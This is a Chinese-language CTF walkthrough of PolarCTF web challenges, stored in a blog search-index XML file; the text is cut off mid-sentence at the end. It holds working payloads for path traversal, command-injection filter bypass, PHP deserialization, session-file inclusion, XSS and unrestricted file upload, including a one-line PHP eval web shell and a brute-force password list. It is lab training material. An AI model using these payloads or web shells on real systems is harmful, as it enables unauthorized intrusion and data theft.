<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>polarctf</title>
      <link href="/posts/bcd86d8.html"/>
      <url>/posts/bcd86d8.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="polarctf靶场"><a href="#polarctf靶场" class="headerlink" title="polarctf靶场"></a>polarctf靶场</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>进入url发现这样一句话，然后看了看cookie，发现value为no，改为yes，发现了base64加密的字符串<br><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-09 19.26.16.png" alt="图片"></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-09 19.27.32.png" alt="截屏2025-03-09 19.26.16" style="zoom:50%;" /></p><p>经过base64解码，得到一个路径，访问看到了源码</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-09 19.28.57.png" alt="截屏2025-03-09 19.28.57" style="zoom:50%;" /></p><p>经过分析，应该是一个伪协议读取，构造payload得到base64解码就可以dedaoflag了,因为后边加了.php所以payload中不需要</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=..././..././..././..././flag</span><br></pre></td></tr></table></figure><h3 id="简单rce"><a href="#简单rce" class="headerlink" title="简单rce"></a>简单rce</h3><p>首先访问的URL出现了下边的代码，分析一下，首先是一个no函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    <span class="comment">//对文件进行语法高亮显示</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no</span>(<span class="params"><span class="variable">$txt</span></span>)</span>&#123;            <span class="comment">//定义一个no函数，并传入变量txt</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i&quot;</span>, <span class="variable">$txt</span>))&#123;       <span class="comment">//preg_match 函数用于执行一个正则表达式匹配</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$txt</span>;            <span class="comment">//返回参数值</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what&#x27;s up&quot;</span>);   <span class="comment">//输出一条消息，并退出当前脚本</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$yyds</span>=(<span class="variable">$_POST</span>[<span class="string">&#x27;yyds&#x27;</span>]);        <span class="comment">//通过POST方式传递参数yyds</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>])&amp;&amp;<span class="variable">$yyds</span>==<span class="string">&#x27;666&#x27;</span>)&#123;  <span class="comment">//通过GET方式传递参数sys；并判断</span></span><br><span class="line">  <span class="keyword">eval</span>(<span class="title function_ invoke__">no</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]));            <span class="comment">//调用no函数，并输出</span></span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;                    <span class="comment">//输出nonono    </span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 14.11.30.png" alt="截屏2025-02-24 14.11.30"></p><p>PHP代码的命令执行函数有</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>() 输出并返回最后一行shell结果。</span><br><span class="line"><span class="title function_ invoke__">exec</span>() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。</span><br><span class="line"><span class="title function_ invoke__">passthru</span>() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。（替换system）</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()/<span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"><span class="comment">//输出函数：</span></span><br><span class="line">cat函数 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac函数 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">nl      类似于cat -n，显示时输出行号</span><br><span class="line">more    根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head    只显示头几行</span><br><span class="line">tail    只显示最后几行</span><br><span class="line">sort    文本内容排列</span><br><span class="line">uniq    可以查看</span><br><span class="line">vim     一种编辑器，这个也可以查看</span><br><span class="line">od      以二进制的方式读取档案内容</span><br><span class="line">vi      一种编辑器，这个也可以查看</span><br><span class="line">strings  在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</span><br><span class="line">paste    把每个文件以列对列的方式，一列列地加以合并</span><br><span class="line">grep    grep &#123; flag.php打印有”&#123;“的一行</span><br><span class="line">sed        一种编辑器，可以用sed -f flag.php读取flag</span><br><span class="line"><span class="comment">//空格绕过：</span></span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">&#123;IFS&#125;$<span class="number">9</span></span><br><span class="line">$IFS$<span class="number">9</span></span><br><span class="line">重定向符：&lt;&gt;（但是不支持后面跟通配符）</span><br><span class="line">水平制表符%<span class="number">09</span></span><br><span class="line">%<span class="number">0</span>a 回车</span><br><span class="line">%<span class="number">0</span>d换行</span><br><span class="line">$IFS$<span class="number">1</span></span><br><span class="line">%<span class="number">09</span>(tab)</span><br><span class="line">%<span class="number">20</span>(space)</span><br><span class="line"><span class="variable">$IFS</span></span><br><span class="line">&lt;</span><br></pre></td></tr></table></figure><p>方法一：使用未被过滤的函数passthru进行绕过<code>/?sys=passthru(&quot;ls%09/&quot;);</code>得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 14.19.15.png" alt="截屏2025-02-24 14.19.15" style="zoom:50%;" /></p><p>方法二：使用转义字符过滤,适用PHP版本PHP&gt;=7</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">以八进制表示的\[<span class="number">0</span>–<span class="number">7</span>]&#123;<span class="number">1</span>,<span class="number">3</span>&#125;转义字符会自动适配byte（如<span class="string">&quot;\400&quot;</span> == “\<span class="number">000</span>”）</span><br><span class="line">以十六进制的\x[<span class="number">0</span>–<span class="number">9</span>A-Fa-f]&#123;<span class="number">1</span>,<span class="number">2</span>&#125;转义字符表示法（如“\x41<span class="string">&quot;）</span></span><br><span class="line"><span class="string">以Unicode表示的\u&#123;[0–9A-Fa-f]+&#125;字符，会输出为UTF-8字符串</span></span><br><span class="line"><span class="string">URL编码协议规定（即 RFC3986 协议）：URL 中只允许包含英文字母、数字、以及这 4 个 - _ . ~ 特殊字符和所有的保留字符</span></span><br><span class="line"><span class="string">sys=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</span></span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 14.19.44.png" alt="截屏2025-02-24 14.19.44" style="zoom:33%;" /></p><h3 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h3><p>发现是文件泄漏，使用dirsearch惊喜目录扫描，发现了/.index.php.swp文件，访问得到了代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jiuzhe</span>(<span class="params"><span class="variable">$xdmtql</span></span>)</span>&#123; <span class="comment">//接受一个xdmtql变量</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sys.*nb/is&#x27;</span>,<span class="variable">$xdmtql</span>); <span class="comment">//匹配变量</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$xdmtql</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;xdmtql&#x27;</span>]; <span class="comment">//判断变量是否为数组类型，不为数组类型往下判断</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$xdmtql</span>))&#123;  <span class="comment">//利用jiuzhe函数进行匹配输入的值</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">jiuzhe</span>(<span class="variable">$xdmtql</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$xdmtql</span>,<span class="string">&#x27;sys nb&#x27;</span>)!==<span class="literal">false</span>)&#123;  <span class="comment">//绕过 preg_match函数后匹配变量，匹配到的话输出flag</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;*******&#125;&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;true .swp file?&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nijilenijile&#x27;</span>;  <span class="comment">//匹配到/sys.*nb/is的话输出</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后使用py脚本,去匹配字符，最后得到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://9c50bb87-6bff-49ba-8089-2f0065677fd6.www.polarctf.com:8090/&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;xdmtql&quot;</span>: <span class="string">&quot;sys nb&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">1000000</span>&#125;</span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.content)</span><br></pre></td></tr></table></figure><h3 id="被黑掉的网站"><a href="#被黑掉的网站" class="headerlink" title="被黑掉的网站"></a>被黑掉的网站</h3><p>首先访问URL什么也没有，用dirsearch扫一下目录,出现了几个可以访问的文件</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.05.30.png" alt="截屏2025-02-24 20.05.30" style="zoom:50%;" /></p><p>首先/index.php.bak文件不是知道是什么，查看一下/shell.php</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.06.15.png" alt="截屏2025-02-24 20.06.15" style="zoom:50%;" /></p><p>发现需要输入，想到上边的index.php.bak文件的内容试一下,首先用py脚本将空格转化为换行，然后使用bp进行爆破当pass=nikel时，出现了flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">replace_spaces_with_newlines</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="comment"># 使用字符串的 replace 方法将空格替换为换行符</span></span><br><span class="line">    result = input_string.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">input_string = <span class="string">&quot;123456 123456789 123123 111111 anhyeuem 1234567 123456789 123456 12345678 000000 asdasd 25251325 1234567890 121212 123321 zxcvbnm qweqwe 456789 112233 aaaaaa 123123123 987654321 11111111 qwerty 147258369 maiyeuem 123qwe 654321 iloveyou 123654 999999 qqqqqq 1111111 147258 hota407 anhtuan 222222 159753 11223344 anhnhoem anh123 159357 qwertyuiop asd123 987654321 emyeuanh mmmmmm 12345 666666 anhanh 123789 phuong 111222 qweasd hanoiyeudau nguyen 789456 1111111111 mylove 789456123 19001560 qwe123 asdfghjkl pppppp anhhung 1234560 abc123 maiyeu 123456a zzzzzz quangninh 987654 555555 tuananh asasas asdfgh zxcvbn 321321 tinhyeu 147852369 456123 matkhau 147852 12345678910 thienthan nikel anhyeu 111111111 toilatoi 10cham0 147258369 456456 khongbiet 789789 a123456 333333 888888 123654789 truong maimaiyeuem hhhhhh&quot;</span></span><br><span class="line">output_string = replace_spaces_with_newlines(input_string)</span><br><span class="line"><span class="built_in">print</span>(output_string)</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.07.21.png" alt="截屏2025-02-24 20.07.21" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.18.19.png" alt="截屏2025-02-24 20.18.19" style="zoom:25%;" /></p><h3 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h3><p>首先通过题目的提示是jwt的题目，那么访问URL发现是个登录和注册，首先自己注册一个看到了cookie有jwt那么，先爆破一下密钥然后重新构造jwt，将username改为admin，使用的工具<a href="https://www.bejson.com/jwt/">https://www.bejson.com/jwt/</a></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.47.14.png" alt="截屏2025-02-24 20.47.14" style="zoom:50%;" /></p><p>然后将生成的jwt放到自己登录的cookie中，刷新页面，发现用户名变为了admin，点击个人中心发现了flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.48.25.png" alt="截屏2025-02-24 20.48.25" style="zoom:50%;" /></p><h3 id=""><a href="#" class="headerlink" title="$$"></a>$$</h3><p>看题目是$$感觉应该是和全局相关的，查看代码，发现是通过GET方式给c一个值，然后通过preg_match()函数进行正则匹配，如果匹配到就输出oh，否则就输出变量a，那么考虑给c一全局变量c=GLOBALS</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-25 14.53.21.png" alt="截屏2025-02-25 14.53.21" style="zoom:50%;" /></p><p>发现给出了flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-25 14.56.43.png" alt="截屏2025-02-25 14.56.43" style="zoom:50%;" /></p><h3 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h3><p>首先访问URL发现有一个输入框，随便输入，查看网页代码发现了file=1.txt和2.txt,点击my dairy发现了</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-25 15.23.56.png" alt="截屏2025-02-25 15.23.56" style="zoom:25%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-25 15.31.47.png" alt="截屏2025-02-25 15.31.47" style="zoom:50%;" /></p><p>那么通过伪协议进行读取（base64编码）<code>php://filter/read=convert.base64-encode/resource=action.php</code>因为题目中给的是action.php所以读取这个文件，然后用base64解码</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-25 15.33.27.png" alt="截屏2025-02-25 15.33.27" style="zoom:25%;" /></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//解码的内容</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(0);</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">if($name)&#123;</span><br><span class="line">    $_SESSION[&quot;username&quot;] = $name;</span><br><span class="line">&#125;</span><br><span class="line">include($_GET[&#x27;file&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=action.php?file=1.txt&gt;my dairy&lt;/a&gt;</span><br><span class="line">&lt;a href=action.php?file=2.txt&gt;my booklist&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>是一个php代码</p><p>session文件名的构造是sess_ + sessionid ， sessionid在cookie中可以查看</p><p>有了参数，开始猜存放session文件的位置，一般默认为tmp，直接执行命令访问session文件</p><p>这里可以采取两种方式得到flag：命令读取或者蚁剑连接shell</p><p>然后通过给name传入shell，用蚁剑读取<code>name=&lt;?php @eval($_POST[a]);?&gt;</code></p><p>命令读取用<code>name=&lt;?=system(&#39;cat+/f*&#39;);?&gt;</code></p><h3 id="PHP反序列化初试"><a href="#PHP反序列化初试" class="headerlink" title="PHP反序列化初试"></a>PHP反序列化初试</h3><p>首先访问url，看到了代码，有两个魔术方法<code>__wakeup()</code>和<code>__toString()</code>，分析代码在Evil类中有个evil变量执行了shell_exec()函数所以<code>evil=&#39;tac f*&#39;</code></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 16.26.28.png" alt="截屏2025-02-26 16.26.28" style="zoom:50%;" /></p><p>然后编写exp，得到flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evil</span>=<span class="string">&#x27;tac f*&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$env</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Easy</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Evil</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- 首先是<span class="keyword">new</span>了两个类，让Easy类的name变量去调用第二个类，然后执行第二个类中的<span class="title function_ invoke__">shell_exec</span>()函数 --&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 16.30.44.png" alt="截屏2025-02-26 16.30.44" style="zoom:25%;" /></p><h3 id="干正则"><a href="#干正则" class="headerlink" title="干正则"></a>干正则</h3><p>访问URL，看到源码</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 16.40.48.png" alt="截屏2025-02-26 16.40.48" style="zoom:33%;" /></p><p>分析一下，首先用get方式传入一个参数id，然后else中有个一个parse_str()函数，他是将参数id中的值进行查找，如果找到就将变量的值改为id中该变量的值</p><p>例如：<code>id=a=123</code>，是将上边变量a的值改为123</p><p>根据这个parse_str()函数就可以给id传入一个a[0]的值，因为下边有if判断a[0]的值和www.polarctf.com是否相等，相等会执行下边参数cmd的值</p><p>构造payload=<code>?id=a[0]=www.polarctf.com&amp;cmd=;tac f*</code>,得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 16.47.36.png" alt="截屏2025-02-26 16.47.36" style="zoom:25%;" /></p><h3 id="uploader"><a href="#uploader" class="headerlink" title="uploader"></a>uploader</h3><p>首先访问URL，得到下边代码，分析代码，首先是获取一个ip地址转化为md5，然后没有什么过滤，写个py脚本传文件吧</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 16.57.23.png" alt="截屏2025-02-26 16.57.23" style="zoom:50%;" /></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&#x27;http://35052cba-8e36-490a-ae62-9e23431088ce.www.polarctf.com:8090/&#x27;</span>  <span class="comment"># 替换成你的服务器地址</span></span><br><span class="line"> </span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;/Users/mayuanzheng/Desktop/马子/hack.php&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;  <span class="comment"># 将文件名替换为你想上传的文件</span></span><br><span class="line"> </span><br><span class="line">response = requests.post(url, files=files)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传成功！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;服务器返回的消息:&quot;</span>, response.text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传失败！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;错误码:&quot;</span>, response.status_code)</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 17.01.46.png" alt="截屏2025-02-26 17.01.46" style="zoom:25%;" /></p><p>上传成功后，给出了路径fc4开头的是目录，前边hack.php为文件名，用蚁剑连接找flag</p><h3 id="debudao"><a href="#debudao" class="headerlink" title="debudao"></a>debudao</h3><p>访问url发现一个输入框，测试了注入，发现不是注入，试了一下xss发现是xss</p><p>首先用<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</code>发现弹了1，那么构造payload<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>得到了flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 17.15.08.png" alt="截屏2025-02-26 17.15.08"></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 17.17.32.png" alt="截屏2025-02-26 17.17.32" style="zoom:50%;" /></p><h3 id="rapyiquan"><a href="#rapyiquan" class="headerlink" title="rapyiquan"></a>rapyiquan</h3><p>访问URL，分析一下代码，应该是用get方法传递一个参数c<em>md，但是过滤了’</em>‘考虑用’[‘替换一下</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 17.29.37.png" alt="截屏2025-02-26 17.29.37" style="zoom:25%;" /></p><p>构造一下<code>c[md=l\s /</code>发现了flag.php文件，然后使用payload=<code>c[md=t\ac /f\lag.php</code></p><h3 id="1ncIud3"><a href="#1ncIud3" class="headerlink" title="1ncIud3"></a>1ncIud3</h3><p>访问URL显示了?page=,那么尝试get方式传入值</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.37.28.png" alt="截屏2025-02-26 18.37.28" style="zoom:50%;" /></p><p>然后尝试给一个flag值,然后根据提示和题目进行修改，想到了因为是在某个目录下，所以用…/./为一组，不出意外基本题型最多也就四组，四组还不行的话就换命令了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">最常用的替换f1a9  f1ag  f149</span><br></pre></td></tr></table></figure><p>构造payload<code>?page=..././..././f1a9</code>得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.37.59.png" alt="截屏2025-02-26 18.37.59" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.40.05.png" alt="截屏2025-02-26 18.40.05" style="zoom:50%;" /></p><h3 id="投喂"><a href="#投喂" class="headerlink" title="投喂"></a>投喂</h3><p>访问URL得到提示</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.44.04.png" alt="截屏2025-02-26 18.44.04"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">欢迎参加CTF挑战赛！</span><br><span class="line">使用以下API进行交互：</span><br><span class="line">POST包含序列化User对象的参数“data”</span><br><span class="line">提示：您可能想了解PHP序列化是如何工作的。尝试使用username和is_admin属性序列化User对象。</span><br><span class="line">额外提示：如果你能让服务器认为你是管理员（is_admin=true），你可能会得到一些特别的东西。</span><br></pre></td></tr></table></figure><p>根据提示构造反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$is_admin</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;is_admin = <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到payload=<code>data=O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;N;s:8:&quot;is_admin&quot;;s:4:&quot;true&quot;;&#125;</code>用post方式传入参数，得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.48.43.png" alt="截屏2025-02-26 18.48.43" style="zoom:25%;" /></p><h3 id="狗黑子的RCE"><a href="#狗黑子的RCE" class="headerlink" title="狗黑子的RCE"></a>狗黑子的RCE</h3><p>访问URL得到的代码，分析一下，get传如gouheizi1可以执行命令，post传入gouheizi2如何通过if就可以执行gouheizi1的命令，发现没有过滤\,构造<code>gouheizi2=gougouheiziheizi</code>因为gouheizi2使用了str_replace()函数进行替换空格，然后去绕过</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.59.56.png" alt="截屏2025-02-26 18.59.56"></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 19.02.27.png" alt="截屏2025-02-26 19.02.27" style="zoom:50%;" /></p><h3 id="井字棋"><a href="#井字棋" class="headerlink" title="井字棋"></a>井字棋</h3><p>首先通过URL发现是一个游戏，一看就是看js源码，发现下边的代码在declareWinner()函数断点，断住了</p><p>根据<code>declareWinner(gameWon.player === huPlayer ? &quot;您赢了！&quot; : &quot;您输了.&quot;);</code>这个代码，只有在您赢了！  的时候才能进行下边通过game.php传到后端取出flag</p><p>那么直接在控制台console中输入<code>declareWinner(&quot;您赢了！&quot;);</code>,在断点的时候发现传到后端的是赢了，那么就能弹出flag了</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 20.31.10.png" alt="截屏2025-02-26 20.31.10" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 20.35.10.png" alt="截屏2025-02-26 20.35.10" style="zoom:25%;" /></p><h3 id="简单的导航站"><a href="#简单的导航站" class="headerlink" title="简单的导航站"></a>简单的导航站</h3><p>首先访问URL获得的信息</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 20.46.31.png" alt="截屏2025-02-26 20.46.31" style="zoom:50%;" /></p><p>首先通过注册一个新用户查看用户列表出现了PHP代码，发现是md5绕过漏洞,发现是md5($user1) === md5($user2)强比较，试一下数组</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 20.43.06.png" alt="截屏2025-02-26 20.43.06" style="zoom:50%;" /></p><ul><li>有一些<a href="https://so.csdn.net/so/search?q=字符串&amp;spm=1001.2101.3001.7020">字符串</a>的MD5值为0e开头，这里记录一下<ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li></ul></li><li>还有MD5和双MD5以后的值都是0e开头的<ul><li>CbDLytmyGm2xQyaLNhWn</li><li>770hQgrBOjrcqftrlaZk</li><li>7r4lGXCH2Ksu2JNT3BYM</li></ul></li></ul><p>通过数组绕过了获得了用户名，发现</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 20.45.36.png" alt="截屏2025-02-26 20.45.36" style="zoom:50%;" /></p><p>在最开始的首页源码中发现了Admin1234!感觉应该是密码吧，直接bp爆破，发现了用户名为P0la2adm1n，然后登录管理员后，上传文件，这里没有什么过滤直接上传，然后路径为/uploads/hack.php</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.08.51.png" alt="截屏2025-02-26 21.08.51" style="zoom:50%;" /></p><p>然后用蚁剑连接后发现了flag目录里边还有flag.txt,点进去发现有好多flag，又想到Flag认证，应该是需要爆破，直接上bp</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.10.48.png" alt="截屏2025-02-26 21.10.48" style="zoom:50%;" /></p><p>爆破成功得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.12.28.png" alt="截屏2025-02-26 21.12.28"></p><h3 id="到底给不给flag呢"><a href="#到底给不给flag呢" class="headerlink" title="到底给不给flag呢"></a>到底给不给flag呢</h3><p>访问URL，分析代码发现了foreach()函数搭配 $$ 是个典型的变量覆盖漏洞，使用 foreach() 遍历数组中的值，将获取到的数组键名作为变量，数组中的键值作为变量的值。GET，POST需要有一个满足key为flag的传参，并且value不能等于flag，若想输出执行到最后输出flag，那么变量覆盖时候不能将 $flag 的值等于除 $flag 外的任意值，即在foreach内的变量覆盖过程中，需要实现</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.26.10.png" alt="截屏2025-02-26 